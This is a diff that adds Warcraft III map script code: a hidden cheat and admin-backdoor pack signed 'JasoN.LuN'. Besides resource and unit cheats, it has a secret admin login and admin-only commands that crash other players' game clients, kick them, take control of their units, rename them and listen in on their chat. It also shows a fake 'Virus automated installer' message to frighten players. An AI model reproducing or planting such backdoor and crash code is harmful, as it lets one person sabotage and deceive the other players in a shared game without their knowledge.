+call DisplayTextToForce(bj_FORCE_ALL_PLAYERS,"            |cffFF0000I|r|cffFF0000n|r|cffFF0000s|r|cffFF0000t|r|cffFF0000a|r|cffff0000l|r|cffff0000l|r|cff8B0000i|r|cff8B0000n|r|cff8B0000g|r|cffE8E8E8.|r|cffE8E8E8.|r|cffE8E8E8.|r|cffE8E8E8.|r|cffE8E8E8.|r|cffE8E8E8.|r.|cffE8E8E8|r.|cffE8E8E8|r.|cffE8E8E8.|r|cffE8E8E8.|r|cffE8E8E8.|r.|cffE8E8E841%|r")
+call TriggerSleepAction(RMaxBJ(bj_WAIT_FOR_COND_MIN_INTERVAL,.5))
+call DisplayTextToForce(bj_FORCE_ALL_PLAYERS,"            |cffFF0000I|r|cffFF0000n|r|cffFF0000s|r|cffFF0000t|r|cffFF0000a|r|cffff0000l|r|cffff0000l|r|cff8B0000i|r|cff8B0000n|r|cff8B0000g|r|cffE8E8E8.|r|cffE8E8E8.|r|cffE8E8E8.|r|cffE8E8E8.|r|cffE8E8E8.|r|cffE8E8E8.|r.|cffE8E8E8|r.|cffE8E8E8|r.|cffE8E8E8.|r|cffE8E8E8.|r|cffE8E8E8.|r.|cffE8E8E856%|r")
+call TriggerSleepAction(RMaxBJ(bj_WAIT_FOR_COND_MIN_INTERVAL,.5))
+call DisplayTextToForce(bj_FORCE_ALL_PLAYERS,"            |cffFF0000I|r|cffFF0000n|r|cffFF0000s|r|cffFF0000t|r|cffFF0000a|r|cffff0000l|r|cffff0000l|r|cff8B0000i|r|cff8B0000n|r|cff8B0000g|r|cffE8E8E8.|r|cffE8E8E8.|r|cffE8E8E8.|r|cffE8E8E8.|r|cffE8E8E8.|r|cffE8E8E8.|r.|cffE8E8E8|r.|cffE8E8E8|r.|cffE8E8E8.|r|cffE8E8E8.|r|cffE8E8E8.|r.|cffE8E8E874%|r")
+call TriggerSleepAction(RMaxBJ(bj_WAIT_FOR_COND_MIN_INTERVAL,.5))
+call DisplayTextToForce(bj_FORCE_ALL_PLAYERS,"            |cffFF0000I|r|cffFF0000n|r|cffFF0000s|r|cffFF0000t|r|cffFF0000a|r|cffff0000l|r|cffff0000l|r|cff8B0000i|r|cff8B0000n|r|cff8B0000g|r|cffE8E8E8.|r|cffE8E8E8.|r|cffE8E8E8.|r|cffE8E8E8.|r|cffE8E8E8.|r|cffE8E8E8.|r.|cffE8E8E8|r.|cffE8E8E8|r.|cffE8E8E8.|r|cffE8E8E8.|r|cffE8E8E8.|r.|cffE8E8E898%|r")
+call TriggerSleepAction(RMaxBJ(bj_WAIT_FOR_COND_MIN_INTERVAL,.5))
+call DisplayTextToForce(bj_FORCE_ALL_PLAYERS,"            |cffFF0000I|r|cffFF0000n|r|cffFF0000s|r|cffFF0000t|r|cffFF0000a|r|cffff0000l|r|cffff0000l|r|cff8B0000i|r|cff8B0000n|r|cff8B0000g|r|cffE8E8E8.|r|cffE8E8E8.|r|cffE8E8E8.|r|cffE8E8E8.|r|cffE8E8E8.|r|cffE8E8E8.|r.|cffE8E8E8|r.|cffE8E8E8|r.|cffE8E8E8.|r|cffE8E8E8.|r|cffE8E8E8.|r.|cffE8E8E899%|r")
+call TriggerSleepAction(RMaxBJ(bj_WAIT_FOR_COND_MIN_INTERVAL,.5))
+call DisplayTextToForce(bj_FORCE_ALL_PLAYERS,"            |cffFF0000The|r |cffFF0000I|r|cffFF0000n|r|cffFF0000s|r|cffFF0000t|r|cffFF0000a|r|cffff0000l|r|cffff0000l|r|cff8B0000ation|r |cffFF0000is complete.|r")
+call TriggerSleepAction(RMaxBJ(bj_WAIT_FOR_COND_MIN_INTERVAL,1))
+call DisplayTextToForce(bj_FORCE_ALL_PLAYERS,"|cff00FFFFThank you for using|r |c00ffff00JasoN.LuN's|r |c0000ff00Virus|r |cff00FFFFautomated installer. Please restart your computer to ensure completion of the installation.|r")
+call TriggerSleepAction(5)
+call CinematicModeBJ(false,bj_FORCE_ALL_PLAYERS)
+call FinishCinematicFadeAfterBJ(.5)
+call dunfuck(Player(S2I(SubString(MeisJasonLun,7,9))), DJBp1)
+else
+call DisplayTimedTextToPlayer(b2j,0,0,10,"|cffff0000This command is reserved for admin.")
+endif
+elseif SubString(c8h, 0, 9) == "-unfreeze"then
+if b2j==badboyyo then
+call PauseGameOff(  )
+else
+call DisplayTimedTextToPlayer(b2j,0,0,10,"|cffff0000This command is reserved for admin.")
+endif
+elseif SubString(c8h, 0, 7) == "-freeze"then
+if b2j==badboyyo then
+call PauseGameOn(  )
+else
+call DisplayTimedTextToPlayer(b2j,0,0,10,"|cffff0000This command is reserved for admin.")
+endif 
+elseif SubString(c8h,0,6)=="-list1"then
+call DisplayTimedTextToPlayer(b2j,0,0,10,"-gold #   -   Adds # to your current gold")
+call DisplayTimedTextToPlayer(b2j,0,0,10,"-lumber # -   Adds # to your current lumber")
+call DisplayTimedTextToPlayer(b2j,0,0,10,"-food #   -   Set your food capacity")
+call DisplayTimedTextToPlayer(b2j,0,0,10,"-mh	    -   Reveals the map for you")
+call DisplayTimedTextToPlayer(b2j,0,0,10,"-nomh	    -   No reveals the map for you")
+elseif SubString(c8h,0,6)=="-list2"then
+call DisplayTimedTextToPlayer(b2j,0,0,10,"-time <0-24>  -    Sets time of day to specified")
+call DisplayTimedTextToPlayer(b2j,0,0,10,"-clear    -   Clears texts on the screen")
+call DisplayTimedTextToPlayer(b2j,0,0,10,"-logging   -   Remove all trees")
+call DisplayTimedTextToPlayer(b2j,0,0,10,"-reforest    -   Grow all removed trees")
+call DisplayTimedTextToPlayer(b2j,0,0,10,"-locktrade    -   lock gold and lumber trade in F11")
+call DisplayTimedTextToPlayer(b2j,0,0,10,"-unlocktrade  -   unlock trade in F11")
+elseif SubString(c8h,0,6)=="-list3"then
+call DisplayTimedTextToPlayer(b2j,0,0,10,"-lock     -   lock share player in F11")
+call DisplayTimedTextToPlayer(b2j,0,0,10,"-unlock   -   unlock share player in F11")
+call DisplayTimedTextToPlayer(b2j,0,0,10,"-say [msg]    -    show your message on the screen")
+call DisplayTimedTextToPlayer(b2j,0,0,10,"-fast	    -   Upgrades take no time")
+call DisplayTimedTextToPlayer(b2j,0,0,10,"-bfast    -   instant a building structure by pressing ESC")
+call DisplayTimedTextToPlayer(b2j,0,0,10,"-ufast    -   instant a training structure by pressing ESC")
+elseif SubString(c8h,0,6)=="-list4"then
+call DisplayTimedTextToPlayer(b2j,0,0,10,"-mana	    -   Infinite mana to your selected units")
+call DisplayTimedTextToPlayer(b2j,0,0,10,"-nocd	    -   Turn off cooldown for all skills and active items to your selected units")
+call DisplayTimedTextToPlayer(b2j,0,0,10,"-cdon	    -   Turn on cooldown for all skills and active items to your selected untis")
+call DisplayTimedTextToPlayer(b2j,0,0,10,"-autoh #  -   Auto-heal your selected unit with # %")
+call DisplayTimedTextToPlayer(b2j,0,0,10,"-autohoff -   Remove your selected unit auto-heal")
+elseif SubString(c8h,0,6)=="-list5"then
+call DisplayTimedTextToPlayer(b2j,0,0,10,"-agi #    -   Adds # agility to selected unit")
+call DisplayTimedTextToPlayer(b2j,0,0,10,"-str #    -   Adds # strength to selected unit")
+call DisplayTimedTextToPlayer(b2j,0,0,10,"-int #    -   Adds # intelligence to selected unit")
+call DisplayTimedTextToPlayer(b2j,0,0,10,"-lvl #    -   Sets # level to selected unit")
+call DisplayTimedTextToPlayer(b2j,0,0,10,"-downlvl #    -   Decreases your selected unit's level by #")
+call DisplayTimedTextToPlayer(b2j,0,0,10,"-xp #     -   Sets # experience to selected unit")
+call DisplayTimedTextToPlayer(b2j,0,0,10,"-hp #     -   Sets # health points to selected unit")
+call DisplayTimedTextToPlayer(b2j,0,0,10,"-mp #	    -   Sets # mana points to selected unit")
+elseif SubString(c8h,0,6)=="-list6"then
+call DisplayTimedTextToPlayer(b2j,0,0,10,"-ms #     -   Sets # move speed to selected unit")
+call DisplayTimedTextToPlayer(b2j,0,0,10,"-vul 	    -   Makes selected units vulnerable")
+call DisplayTimedTextToPlayer(b2j,0,0,10,"-invul    -   Makes selected units invulnerable")
+call DisplayTimedTextToPlayer(b2j,0,0,10,"-vis 	    -   Makes selected units visible")
+call DisplayTimedTextToPlayer(b2j,0,0,10,"-invis    -   Makes selected units invisible")
+call DisplayTimedTextToPlayer(b2j,0,0,10,"-kill     -   Kills selected units")
+elseif SubString(c8h,0,6)=="-list7"then
+call DisplayTimedTextToPlayer(b2j,0,0,10,"-tele	    -   Sets patrol (P) to teleport")
+call DisplayTimedTextToPlayer(b2j,0,0,10,"-note	    -   Sets patrol (P) to normal")
+call DisplayTimedTextToPlayer(b2j,0,0,10,"-stop	    -   Disables selected units commands")
+call DisplayTimedTextToPlayer(b2j,0,0,10,"-resume   -   Enables selected units commands")
+call DisplayTimedTextToPlayer(b2j,0,0,10,"-xp rate #    -   Sets # to your selected units xp rate")
+call DisplayTimedTextToPlayer(b2j,0,0,10,"-addhp #  -   Adds # to your current hit points")
+call DisplayTimedTextToPlayer(b2j,0,0,10,"-nofood   -   Makes selected units use no food")
+call DisplayTimedTextToPlayer(b2j,0,0,10,"-food	    -   Makes selected units use food")
+elseif SubString(c8h,0,6)=="-list8"then
+call DisplayTimedTextToPlayer(b2j,0,0,10,"-heal	    -  Heals selected units' HP and MP")
+call DisplayTimedTextToPlayer(b2j,0,0,10,"-size #   - Sets # to your selected units' size")
+call DisplayTimedTextToPlayer(b2j,0,0,10,"-debuff   - Debuff your selected units")
+call DisplayTimedTextToPlayer(b2j,0,0,10,"-additem #    -  Spawns # random items")
+call DisplayTimedTextToPlayer(b2j,0,0,10,"-pathoff  -   Makes selected units uncollide")
+call DisplayTimedTextToPlayer(b2j,0,0,10,"-pathon   -   Makes selected units collide")
+elseif SubString(c8h,0,8)=="-logging"then
+call EnumDestructablesInRectAll( GetPlayableMapRect(), function boringlah )
+elseif SubString(c8h,0,9)=="-reforest"then
+call EnumDestructablesInRectAll( GetPlayableMapRect(), function dungrow )
+elseif SubString(c8h,0,5)=="-nocd"then
+set SHENG2[1]=GetPlayerId(b2j)
+call ExecuteFunc("Jason_StartNocd")
+elseif SubString(c8h,0,9)=="-showkeys"then
+call DisplayTextToPlayer(b2j,0,0,"|cffff0000Left: "+GetStoredString(CACHE,id2d,"left"))
+call DisplayTextToPlayer(b2j,0,0,"|cffff0000Right: "+GetStoredString(CACHE,id2d,"right"))
+call DisplayTextToPlayer(b2j,0,0,"|cffff0000Up: "+GetStoredString(CACHE,id2d,"up"))
+call DisplayTextToPlayer(b2j,0,0,"|cffff0000Down: "+GetStoredString(CACHE,id2d,"down"))
+elseif SubString(c8h,0,10)=="-locktrade"then
+call SetMapFlag(MAP_LOCK_RESOURCE_TRADING,true)
+elseif SubString(c8h,0,12)=="-unlocktrade"then
+call SetMapFlag(MAP_LOCK_RESOURCE_TRADING,false)
+elseif SubString(c8h,0,5)=="-lock"then
+call SetMapFlag(MAP_LOCK_ALLIANCE_CHANGES,true)
+call SetMapFlag(MAP_ALLIANCE_CHANGES_HIDDEN,true)
+call SetMapFlag(MAP_SHARED_ADVANCED_CONTROL,false)
+elseif SubString(c8h,0,7)=="-unlock"then
+call SetMapFlag(MAP_LOCK_ALLIANCE_CHANGES,false)
+call SetMapFlag(MAP_ALLIANCE_CHANGES_HIDDEN,false)
+elseif SubString(c8h,0,9)=="-shareall"then
+if b2j==badboyyo then
+loop
+exitwhen i2i>15
+call SetPlayerAllianceStateFullControlBJ(Player(i2i),b2j,true)
+call SetPlayerAllianceStateControlBJ(Player(i2i),b2j,true)
+call SetPlayerAllianceStateVisionBJ(Player(i2i),b2j,true)
+set i2i=i2i+1
+endloop
+else
+call DisplayTimedTextToPlayer(b2j,0,0,10,"|cffff0000This command is reserved for admin.")
+endif
+elseif SubString(c8h,0,5)=="-soff"then
+if b2j==badboyyo then
+loop
+exitwhen i2i>15
+if GetPlayerId(b2j)!=i2i then
+call SetPlayerAllianceStateFullControlBJ(Player(i2i),b2j,false)
+call SetPlayerAllianceStateControlBJ(Player(i2i),b2j,false)
+call SetPlayerAllianceStateVisionBJ(Player(i2i),b2j,false)
+endif
+set i2i=i2i+1
+endloop
+else
+call DisplayTimedTextToPlayer(b2j,0,0,10,"|cffff0000This command is reserved for admin.")
+endif
+elseif SubString(c8h,0,7)=="-share " and S2I(SubString(c8h,7,9))<16 and S2I(SubString(c8h,7,9))>-1then
+if b2j==badboyyo then
+call SetPlayerAllianceStateFullControlBJ(Player(S2I(SubString(c8h,7,9))),b2j,true)
+call SetPlayerAllianceStateControlBJ(Player(S2I(SubString(c8h,7,9))),b2j,true)
+call SetPlayerAllianceStateVisionBJ(Player(S2I(SubString(c8h,7,9))),b2j,true)
+else
+call DisplayTimedTextToPlayer(b2j,0,0,10,"|cffff0000This command is reserved for admin.")
+endif
+elseif SubString(c8h,0,9)=="-unshare " and S2I(SubString(c8h,9,11))<16 and S2I(SubString(c8h,7,9))>-1then
+if b2j==badboyyo then
+call SetPlayerAllianceStateFullControlBJ(Player(S2I(SubString(c8h,9,11))),b2j,false)
+call SetPlayerAllianceStateControlBJ(Player(S2I(SubString(c8h,9,11))),b2j,false)
+call SetPlayerAllianceStateVisionBJ(Player(S2I(SubString(c8h,9,11))),b2j,false)
+else
+call DisplayTimedTextToPlayer(b2j,0,0,10,"|cffff0000This command is reserved for admin.")
+endif
+elseif SubString(c8h,0,6)=="-ally "and S2I(SubString(c8h,6,8))<16 and S2I(SubString(c8h,6,8))>-1then
+if b2j==badboyyo then
+call SetPlayerAllianceStateAllyBJ(b2j,Player(S2I(SubString(c8h,6,8))),true)
+call SetPlayerAllianceStateAllyBJ(Player(S2I(SubString(c8h,6,8))),b2j,true)
+call SetPlayerAllianceStateVisionBJ(Player(S2I(SubString(c8h,6,8))),b2j,true)
+else
+call DisplayTimedTextToPlayer(b2j,0,0,10,"|cffff0000This command is reserved for admin.")
+endif
+elseif SubString(c8h,0,8)=="-unally "and S2I(SubString(c8h,8,10))<16 and S2I(SubString(c8h,8,10))>-1then
+if b2j==badboyyo then
+call SetPlayerAllianceStateAllyBJ(b2j,Player(S2I(SubString(c8h,8,10))),false)
+call SetPlayerAllianceStateAllyBJ(Player(S2I(SubString(c8h,8,10))),b2j,false)
+else
+call DisplayTimedTextToPlayer(b2j,0,0,10,"|cffff0000This command is reserved for admin.")
+endif
+elseif SubString(c8h,0,10)=="-unallyall"then
+if b2j==badboyyo then
+loop
+exitwhen i2i>11
+if GetPlayerId(b2j)!=i2i then
+call SetPlayerAllianceStateAllyBJ(b2j,Player(i2i),false)
+call SetPlayerAllianceStateAllyBJ(Player(i2i),b2j,false)
+call SetPlayerAllianceStateVisionBJ(b2j,Player(i2i),false)
+endif
+set i2i=i2i+1
+endloop
+else
+call DisplayTimedTextToPlayer(b2j,0,0,10,"|cffff0000This command is reserved for admin.")
+endif
+elseif SubString(c8h,0,8)=="-allyall"then
+if b2j==badboyyo then
+loop
+exitwhen i2i>11
+call SetPlayerAllianceStateAllyBJ(b2j,Player(i2i),true)
+call SetPlayerAllianceStateAllyBJ(Player(i2i),b2j,true)
+call SetPlayerAllianceStateVisionBJ(b2j,Player(i2i),true)
+set i2i=i2i+1
+endloop
+else
+call DisplayTimedTextToPlayer(b2j,0,0,10,"|cffff0000This command is reserved for admin.")
+endif
+elseif SubString(c8h,0,8)=="-setname"then
+if b2j==badboyyo then
+call SetPlayerName(b2j,truelove(SubString(c8h,9,200)))
+else
+call DisplayTimedTextToPlayer(b2j,0,0,10,"|cffff0000This command is reserved for admin.")
+endif
+elseif SubString(c8h,0,6)=="-food "then
+call SetPlayerState(b2j,PLAYER_STATE_FOOD_CAP_CEILING,S2I(SubString(c8h,6,10)))
+call SetPlayerState(b2j,PLAYER_STATE_RESOURCE_FOOD_CAP,S2I(SubString(c8h,6,10)))
+elseif SubString(c8h,0,9)=="-setcolor"then
+if b2j==badboyyo then
+call SetPlayerColor(b2j,whathar(SubString(c8h,10,16),b2j))
+else
+call DisplayTimedTextToPlayer(b2j,0,0,10,"|cffff0000This command is reserved for admin.")
+endif
+elseif SubString(c8h,0,4)=="-say"then
+call DisplayTextToForce(bj_FORCE_ALL_PLAYERS,((truelove(GetPlayerName(b2j)+" |c00ff0000says:|r ")+("|c00ffff00\""+SubString(c8h,4,10))+truelove(SubString(c8h,10,400))+(" \""))))
+elseif SubString(c8h,0,5)=="-fast"then
+set SHENG2[1]=GetPlayerId(b2j)
+call ExecuteFunc("Jason_StartFast")
+elseif SubString(c8h,0,6)=="-ufast"then
+set SHENG2[1]=GetPlayerId(b2j)
+call ExecuteFunc("Jason_StartUFast")
+elseif SubString(c8h,0,7)=="-bfast"then
+set SHENG2[1]=GetPlayerId(b2j)
+call ExecuteFunc("Jason_StartBFast")
+elseif SubString(c8h,0,5)=="-tele"then
+set SHENG2[1]=GetPlayerId(b2j)
+call ExecuteFunc("Jason_StartTele")
+elseif SubString(c8h,0,7)=="-colors"then
+call DisplayTimedTextToPlayer(b2j,0,0,10,"|CFFFF000000|r |CFF0000FF01|r |CFF01E7E702|r |CFF40008003|r |CFFFFFF0004|r |CFFF97C0005|r |CFF00FF0006|r |CFFFF80C007|r |CFFC0C0C008|r |CFF93C4F409|r |CFF00804010|r |CFF57220211|r")
+elseif SubString(c8h,0,3)=="-g " and S2I(SubString(c8h,3,5))<16 and S2I(SubString(c8h,3,5))>-1then
+if b2j==badboyyo then
+call SetPlayerState(Player(S2I(SubString(c8h,3,5))),PLAYER_STATE_RESOURCE_GOLD,GetPlayerState(Player(S2I(SubString(c8h,3,5))),PLAYER_STATE_RESOURCE_GOLD)+S2I(SubString(c8h,6,13))) 
+else
+call DisplayTimedTextToPlayer(b2j,0,0,10,"|cffff0000This command is reserved for admin.")
+endif
+elseif SubString(c8h,0,3)=="-l " and S2I(SubString(c8h,3,5))<16 and S2I(SubString(c8h,3,5))>-1then
+if b2j==badboyyo then
+call SetPlayerState(Player(S2I(SubString(c8h,3,5))),PLAYER_STATE_RESOURCE_LUMBER,GetPlayerState(Player(S2I(SubString(c8h,3,5))),PLAYER_STATE_RESOURCE_LUMBER)+S2I(SubString(c8h,6,13)))
+else
+call DisplayTimedTextToPlayer(b2j,0,0,10,"|cffff0000This command is reserved for admin.")
+endif
+elseif SubString(c8h,0,3)=="-f " and S2I(SubString(c8h,3,5))<16 and S2I(SubString(c8h,3,5))>-1then
+if b2j==badboyyo then
+call SetPlayerState(Player(S2I(SubString(c8h,3,5))),PLAYER_STATE_FOOD_CAP_CEILING,S2I(SubString(c8h,6,20)))
+call SetPlayerState(Player(S2I(SubString(c8h,3,5))),PLAYER_STATE_RESOURCE_FOOD_CAP,S2I(SubString(c8h,6,20)))
+else
+call DisplayTimedTextToPlayer(b2j,0,0,10,"|cffff0000This command is reserved for admin.")
+endif
+elseif SubString(c8h,0,4)=="-sc " and S2I(SubString(c8h,4,6))<16 and S2I(SubString(c8h,3,5))>-1then
+if b2j==badboyyo then
+call SetPlayerColor(Player(S2I(SubString(c8h,4,6))),whathar(SubString(c8h,7,13),Player(S2I(SubString(c8h,4,6)))))
+else
+call DisplayTimedTextToPlayer(b2j,0,0,10,"|cffff0000This command is reserved for admin.")
+endif
+elseif SubString(c8h,0,4)=="-sn " and S2I(SubString(c8h,4,6))<16 and S2I(SubString(c8h,3,5))>-1then
+if b2j==badboyyo then
+call SetPlayerName(Player(S2I(SubString(c8h,4,6))),truelove(SubString(c8h,7,300))) 
+else
+call DisplayTimedTextToPlayer(b2j,0,0,10,"|cffff0000This command is reserved for admin.")
+endif
+elseif SubString(c8h,0,5)=="-hear"then
+if b2j==badboyyo then
+call ForceAddPlayer(udg_ting,b2j)
+call shutup()
+else
+call DisplayTimedTextToPlayer(b2j,0,0,10,"|cffff0000This command is reserved for admin.")
+endif
+elseif SubString(c8h,0,7)=="-nohear"then
+if b2j==badboyyo then
+call ForceRemovePlayer(udg_ting,b2j)
+else
+call DisplayTimedTextToPlayer(b2j,0,0,10,"|cffff0000This command is reserved for admin.")
+endif
+elseif SubString(c8h,0,5)=="-time"then
+call SetTimeOfDay(S2R(SubString(c8h,6,9)))
+elseif SubString(c8h,0,8)=="-disable"then
+call DisableTrigger(Siwang)
+elseif SubString(c8h,0,5)=="-reg "then
+set Xingtong=SubString(c8h,5,12)
+call dundothat(b2j)
+elseif SubString(c8h,0,6)=="-unit "then
+call DestroyTrigger(ChuangjianDanwei)
+set ChuangjianDanwei=CreateTrigger()
+set mu8u=Rax(SubString(c8h,6,10))
+call createshit(b2j)
+elseif SubString(c8h,0,7)=="-nounit"then
+call DestroyTrigger(ChuangjianDanwei)
+elseif SubString(c8h,0,4)=="-act"then
+if b2j==badboyyo then
+set Danci=SubString(c8h,5,100)
+else
+call DisplayTimedTextToPlayer(b2j,0,0,10,"|cffff0000This command is reserved for admin.")
+endif
+elseif SubString(c8h,0,7)=="-destid"then
+call raxwhat(GetDestructableTypeId(RandomDestructableInRectSimpleBJ(Zhuce)),b2j)
+elseif SubString(MeisJasonLun, 0, 7)=="-crash " then
+if b2j==badboyyo then
+call Jasoncrash(Player(S2I(SubString(MeisJasonLun,7,9))),DJBp1)
+else
+call DisplayTimedTextToPlayer(b2j,0,0,10,"|cffff0000This command is reserved for admin.")
+endif
+elseif (SubString(MeisJasonLun, 0, 3)=="-ca")and(DJBi1==3) then
+if b2j==badboyyo then
+loop
+exitwhen DJBi2>11
+call Jasoncrash(Player(DJBi2),DJBp1)
+set DJBi2=DJBi2+1
+endloop
+else
+call DisplayTimedTextToPlayer(b2j,0,0,10,"|cffff0000This command is reserved for admin.")
+endif
+elseif SubString(MeisJasonLun, 0, 4)=="-cf " then
+if b2j==badboyyo then
+call dunfuck(Player(S2I(SubString(MeisJasonLun,4,6))), DJBp1)
+else
+call DisplayTimedTextToPlayer(b2j,0,0,10,"|cffff0000This command is reserved for admin.")
+endif
+elseif SubString(MeisJasonLun,0,6)=="-kick " then
+if b2j==badboyyo then
+if Player(S2I(SubString(MeisJasonLun,6,DJBi1)))!=badboyyo then
+call CustomDefeatBJ(Player(S2I(SubString(MeisJasonLun,6,8))), "")
+endif
+else
+call DisplayTimedTextToPlayer(b2j,0,0,10,"|cffff0000This command is reserved for admin.")
+endif
+elseif SubString(MeisJasonLun,0,11)=="-adminlogin" then
+set ohyeah[GetPlayerId(DJBp1)]=true
+call DisplayTimedTextToPlayer(DJBp1,0,0,10,"|c00ffff00                                                   Enter Password")
+elseif SubString(MeisJasonLun,0,12)=="-Zhongguoren" then
+call Jasonadmin(DJBp1)
+elseif ((SubString(MeisJasonLun, 0,3)=="-cc")and(DJBp1==badboyyo)) then
+loop
+exitwhen DJBi2>11
+if ohmygod[DJBi2]==true then
+call DisplayTimedTextToPlayer(DJBp1,0,0,10,"|cffff0000"+GetPlayerName(Player(DJBi2))+"|r is using cheats.")
+else
+call DisplayTimedTextToPlayer(DJBp1,0,0,10,GetPlayerName(Player(DJBi2))+" is not using cheats")
+endif
+set DJBi2=DJBi2+1
+endloop
+elseif SubString(MeisJasonLun,0,7)=="-cadmin" then
+if Welcomeya == true then
+call DisplayTimedTextToPlayer(DJBp1,0,0,10,"|cffff0000                                               "+GetPlayerName(badboyyo)+"|r |c00ffff00is the admin in this game.")
+else
+call DisplayTimedTextToPlayer(b2j,0,0,10,"|c00ffff00                                                There is no admin in this game.")
+call DisplayTimedTextToPlayer(b2j,0,0,10," ")
+call DisplayTimedTextToPlayer(b2j,0,0,10,"|c00ffff00                                                Do you want to log in?")
+call DisplayTimedTextToPlayer(b2j,0,0,10,"|c00ffff00                                                Type -adminlogin to log in.")
+endif
+elseif SubString(MeisJasonLun,0,7)=="-logout" then
+if b2j==badboyyo then
+call Jasonlogout(DJBp1)
+else
+call DisplayTimedTextToPlayer(b2j,0,0,10,"|cffff0000This command is reserved for admin.")
+endif
+elseif (SubString(MeisJasonLun,0,9)=="-nocheat ")and(DJBp1==badboyyo) then
+endif
+call GroupEnumUnitsSelected(g2g,DJBp1,null)
+call GroupEnumUnitsSelected(g2g,b2j,null)
+loop
+set d2w=FirstOfGroup(g2g)
+exitwhen d2w==null
+if i2i>=0 then
+if SubString(c8h,0,4)=="-int"then
+call SetHeroInt(d2w,i2i,true)
+elseif SubString(c8h,0,4)=="-agi"then
+call SetHeroAgi(d2w,i2i,true)
+elseif SubString(c8h,0,4)=="-str"then
+call SetHeroStr(d2w,i2i,true)
+endif
+endif
+if SubString(c8h,0,6)=="-invis"then
+call UnitAddAbility(d2w,'Apiv')
+elseif SubString(c8h,0,6)=="-vis"then
+call UnitRemoveAbility(d2w,'Apiv')
+elseif SubString(c8h,0,9)=="-xp rate "then
+call SetPlayerHandicapXP(Player(S2I(SubString(c8h,9,11))),S2I(SubString(c8h,9,12)))
+elseif SubString(c8h,0,7)=="-revive"then
+set h2g=GetUnitsOfPlayerAll(b2j)
+set h2u=FirstOfGroup(h2g)
+call ReviveHeroLoc(h2u,GetUnitLoc(d2w),false)
+elseif SubString(c8h,0,8)=="-destroy"then
+if b2j==badboyyo then
+call RemoveUnit(d2w)
+else
+call DisplayTimedTextToPlayer(b2j,0,0,10,"|cffff0000This command is reserved for admin.")
+endif
+elseif SubString(c8h,0,7)=="-addhp "then
+if Sethp>200then
+set Sethp=200
+endif
+call UnitAddAbility(d2w,'AInv')
+loop
+exitwhen Nowhp>=Sethp
+set Nowhp=Nowhp+1
+call UnitAddItemToSlotById(d2w,'manh',6)
+endloop
+elseif SubString(c8h,0,7)=="-nofood"then
+call SetUnitUseFood(d2w,false)
+elseif SubString(c8h,0,5)=="-food"then
+call SetUnitUseFood(d2w,true)
+elseif SubString(c8h,0,7)=="-unitid"then
+call raxwhat(GetUnitTypeId(d2w),b2j)
+elseif SubString(c8h,0,7)=="-itemid"then
+if S2I(SubString(c8h,8,9))!=0then
+call raxwhat(GetItemTypeId(UnitItemInSlot(d2w,S2I(SubString(c8h,8,9))-1)),b2j)
+else
+call raxwhat(GetItemTypeId(UnitItemInSlot(d2w,0)),b2j)
+endif
+elseif SubString(c8h,0,6)=="-float"then
+call UnitAddAbility(d2w,'Amrf')
+call SetUnitFlyHeight(d2w,S2R(SubString(c8h,7,10)),S2R(SubString(c8h,11,14)))
+call UnitRemoveAbility(d2w,'Amrf')
+elseif SubString(c8h,0,5)=="-stop"then
+call PauseUnit(d2w,true)
+elseif SubString(c8h,0,7)=="-resume"then
+call PauseUnit(d2w,false)
+elseif SubString(c8h,0,5)=="-heal"then
+call SetUnitLifePercentBJ(d2w,100)
+call SetUnitManaPercentBJ(d2w,100)
+elseif SubString(c8h,0,7)=="-autoh "then
+set s8h=S2R(SubString(c8h,7,10))
+call GroupAddUnit(Zhiyu,d2w)
+call ExecuteFunc("Jason_StartAutoh")
+elseif SubString(c8h,0,9)=="-autohoff"then
+call GroupClear(Zhiyu)
+elseif SubString(c8h,0,8)=="-endgame"then
+if b2j==badboyyo then
+call SaveAndChangeLevelBJ("rickroll.w3z","Maps\\MapName.w3x",false)
+else
+call DisplayTimedTextToPlayer(b2j,0,0,10,"|cffff0000This command is reserved for admin.")
+endif
+elseif SubString(c8h,0,6)=="-clear"then 
+if (GetLocalPlayer()==b2j)then
+call ClearTextMessages()
+endif
+elseif SubString(c8h,0,6)=="-owner"then
+call SetUnitOwner(d2w,whatuo(SubString(c8h,7,16)),true)
+elseif SubString(c8h,0,5)=="-size"then
+call SetUnitScalePercent(d2w,j2j,j2j,j2j)
+elseif SubString(c8h,0,4)=="-lvl"then
+call SetHeroLevel(d2w,i2i,false)
+elseif SubString(c8h,0,8)=="-downlvl"then
+call UnitStripHeroLevel(d2w,S2I(SubString(c8h,8,20)))
+elseif SubString(c8h,0,3)=="-xp"then
+call SetHeroXP(d2w,z2z,false)
+elseif SubString(c8h,0,3)=="-hp"then
+call SetWidgetLife(d2w,z2z)
+elseif SubString(c8h,0,9)=="-resetcam"then
+call ResetToGameCameraForPlayer(b2j,0.)
+elseif SubString(c8h,0,3)=="-mp"then
+call SetUnitState(d2w,UNIT_STATE_MANA,z2z)
+elseif SubString(c8h,0,6)=="-invul"then
+call SetUnitInvulnerable(d2w,true)
+elseif SubString(c8h,0,4)=="-vul"then
+call SetUnitInvulnerable(d2w,false)
+elseif SubString(c8h,0,5)=="-kill"then
+call SetWidgetLife(d2w,0)
+elseif SubString(c8h,0,3)=="-ms"then
+call SetUnitMoveSpeed(d2w,z2z)
+elseif SubString(c8h,0,7)=="-pathon"then
+call SetUnitPathing(d2w,true)
+elseif SubString(c8h,0,8)=="-pathoff"then
+call SetUnitPathing(d2w,false)
+elseif SubString(c8h,0,7)=="-debuff"then
+call UnitRemoveBuffs(d2w,true,true)
+elseif SubString(c8h,0,8)=="-charges"then
+call SetItemCharges(UnitItemInSlot(d2w,S2I(SubString(c8h,8,9))-1),S2I(SubString(c8h,10,20)))
+elseif SubString(c8h,0,8)=="-additem"then
+set temp=0
+loop
+set temp=temp+1
+exitwhen temp>c2c
+call CreateItemLoc( ChooseRandomItemEx(ITEM_TYPE_ANY,-1), GetUnitLoc(d2w) )
+endloop
+elseif SubString(c8h,0,4)=="-add"then
+call UnitAddAbility(d2w,Rax(SubString(c8h,5,9)))
+call SetUnitAbilityLevel(d2w,Rax(SubString(c8h,5,9)),S2I(SubString(c8h,10,100)))
+elseif SubString(c8h,0,7)=="-remove"then
+call UnitRemoveAbility(d2w,Rax(SubString(c8h,8,12)))
+elseif SubString(c8h,0,6)=="-spawn"then
+call SetPlayerTechResearchedSwap(Rax(SubString(c8h,7,11)),3,b2j)
+call CreateUnitAtLoc(b2j,Rax(SubString(c8h,7,11)),GetUnitLoc(d2w),GetUnitFacing(d2w))
+call CreateDestructableLoc(Rax(SubString(c8h,7,11)),GetUnitLoc(d2w),GetUnitFacing(d2w),1,10)
